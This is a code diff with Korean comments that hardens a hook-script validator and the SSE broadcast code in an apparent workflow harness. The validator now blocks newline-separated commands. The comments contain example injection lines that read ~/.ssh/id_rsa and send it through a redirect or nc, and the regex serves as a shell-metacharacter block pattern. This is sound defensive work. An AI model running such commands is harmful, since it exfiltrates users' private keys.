@@ -231,7 +231,8 @@ function getWorkspacePath(config: WorkflowConfig, issue: HarnessIssue): string {
 // >  — 리다이렉트 (cat ~/.ssh/id_rsa > /tmp/leak)
 // ;  — 명령 분리자 (command1; command2)
 // <( — 프로세스 치환
-const HOOK_UNSAFE_RE = /\$\(|`[^`]*`|\|+|>+|&&|;|<\(/
+// \n/\r — 줄바꿈 다중 명령 (git clone repo\ncat ~/.ssh/id_rsa | nc ...)
+const HOOK_UNSAFE_RE = /\$\(|`[^`]*`|\|+|>+|&&|;|<\(|[\r\n]/
 
 function runHook(script: string, cwd: string, timeoutMs: number): Promise<void> {
   if (HOOK_UNSAFE_RE.test(script)) {
@@ -346,14 +347,21 @@ function broadcastWorker(worker: HarnessWorker, message: string) {
   for (const client of worker.sseClients) {
     // 이미 닫힌 클라이언트 정리 — zombie 연결 write 방지
     if (client.destroyed || client.writableEnded) { worker.sseClients.delete(client); continue }
-    try { client.write(payload) } catch { worker.sseClients.delete(client) }
+    try {
+      const ok = client.write(payload)
+      if (!ok) worker.sseClients.delete(client)  // 백프레셔 — 느린 클라이언트 제거
+    } catch { worker.sseClients.delete(client) }
   }
 }
 
 function broadcastOrch(orch: HarnessOrchestrator, data: Record<string, unknown>) {
   const payload = `data: ${JSON.stringify(data)}\n\n`
   for (const client of orch.sseClients) {
-    try { client.write(payload) } catch { orch.sseClients.delete(client) }
+    if (client.destroyed || client.writableEnded) { orch.sseClients.delete(client); continue }
+    try {
+      const ok = client.write(payload)
+      if (!ok) orch.sseClients.delete(client)  // 백프레셔 — 느린 클라이언트 제거
+    } catch { orch.sseClients.delete(client) }
   }
 }
 
